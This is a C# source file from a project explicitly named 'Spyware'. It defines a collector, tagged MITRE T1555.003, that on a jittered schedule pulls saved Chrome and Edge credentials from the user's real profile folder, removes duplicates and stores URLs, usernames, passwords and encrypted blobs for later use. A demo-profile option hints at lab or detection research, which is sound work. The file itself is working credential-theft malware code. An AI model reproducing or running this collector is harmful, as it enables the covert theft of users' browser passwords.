using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Scheduling;
using Spyware.Storage;

namespace Spyware.Collectors.Browsers;

/// <summary>T1555.003 — Credentials from Password Stores: Credentials from Web Browsers.</summary>
public sealed class BrowserCredentialProvider : ICollector
{
    private const int SeenHashLimit = 5_000;

    private readonly AgentPaths _paths;
    private readonly LocalEventRepository _repository;
    private readonly SpoolManager _spool;
    private readonly BrowserSection _config;
    private readonly ILog _log;
    private readonly HashSet<string> _seenKeys = new(StringComparer.OrdinalIgnoreCase);
    private readonly string _localAppData;
    private PeriodicTask? _task;

    public string Name => "browsers";

    public int TotalExtracted { get; private set; }
    public int LastRunExtracted { get; private set; }
    public int SkippedUnchangedCount { get; private set; }

    /// <summary>
    /// <paramref name="localAppData"/> permite señalar un árbol de perfiles de demostración
    /// (o de pruebas) en lugar del `%LOCALAPPDATA%` del usuario; por defecto el real.
    /// </summary>
    public BrowserCredentialProvider(AgentPaths paths, LocalEventRepository repository,
                                     SpoolManager spool, BrowserSection config, ILog log,
                                     string? localAppData = null)
    {
        _paths = paths;
        _repository = repository;
        _spool = spool;
        _config = config;
        _log = log;
        _localAppData = string.IsNullOrWhiteSpace(localAppData)
            ? Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            : localAppData;
    }

    public void Start()
    {
        if (!_config.Enabled)
        {
            _log.Info("Collector de navegadores deshabilitado.");
            return;
        }

        _task = new PeriodicTask(
            Name,
            () => CollectAll(),
            TimeSpan.FromMinutes(Math.Max(1, _config.IntervalMinutes)),
            _config.JitterSeconds,
            _log);

        _task.Start(runImmediately: true);
    }

    public void Stop()
    {
        _task?.Dispose();
        _task = null;
    }

    public int CollectAll()
    {
        int total = 0;
        int skipped = 0;

        foreach (BrowserDefinition definition in BrowserDefinition.All)
        {
            bool enabled = definition.Id switch
            {
                "chrome" => _config.Chrome,
                "edge" => _config.Edge,
                _ => false
            };

            if (!enabled) continue;

            string userDataRoot = Path.Combine(_localAppData, definition.RelativeUserDataPath);
            if (!Directory.Exists(userDataRoot))
            {
                _log.Debug($"{definition.DisplayName} no tiene perfiles para este usuario.");
                continue;
            }

            try
            {
                var extractor = new ChromiumCredentialExtractor(definition, userDataRoot, _paths, _config, _log);
                IReadOnlyList<CredentialEvent> events = extractor.Collect();

                IReadOnlyList<CredentialEvent> fresh = _config.SkipUnchanged
                    ? FilterUnchanged(events)
                    : events;

                skipped += events.Count - fresh.Count;

                if (fresh.Count > 0)
                    total += _repository.InsertCredentials(fresh);
            }
            catch (Exception ex)
            {
                _log.Error($"Extracción en {definition.DisplayName} falló.", ex);
            }
        }

        LastRunExtracted = total;
        TotalExtracted += total;
        SkippedUnchangedCount += skipped;
        _log.Info($"Credenciales procesadas en este ciclo: {total}" +
                  (skipped > 0 ? $" ({skipped} sin cambios omitidas)." : "."));

        return total;
    }

    /// <summary>
    /// El navegador no avisa de los cambios, así que cada ciclo vuelve a ver las mismas
    /// credenciales. Se registra solo lo nuevo o lo que cambió (contraseña, estado de
    /// descifrado o blob), el mismo criterio que las notas y el portapapeles. Los fallos,
    /// que no traen contraseña ni blob con que comparar, se registran siempre.
    /// </summary>
    private List<CredentialEvent> FilterUnchanged(IReadOnlyList<CredentialEvent> events)
    {
        var fresh = new List<CredentialEvent>(events.Count);

        lock (_seenKeys)
        {
            foreach (CredentialEvent credential in events)
            {
                if (!IsComparable(credential))
                {
                    fresh.Add(credential);
                    continue;
                }

                string key = KeyOf(credential);

                if (_seenKeys.Contains(key)) continue;

                if (_seenKeys.Count < SeenHashLimit)
                    _seenKeys.Add(key);

                fresh.Add(credential);
            }
        }

        return fresh;
    }

    /// <summary>Sin contraseña ni blob no hay nada que comparar: es un fallo de lectura.</summary>
    private static bool IsComparable(CredentialEvent credential) =>
        credential.Password is not null || credential.EncryptedBlobBase64 is not null;

    private static string KeyOf(CredentialEvent credential) =>
        string.Join('\u001f', credential.Browser, credential.Profile, credential.Url,
                    credential.Username, credential.Status, credential.Password ?? string.Empty,
                    credential.EncryptedBlobBase64 ?? string.Empty);
}
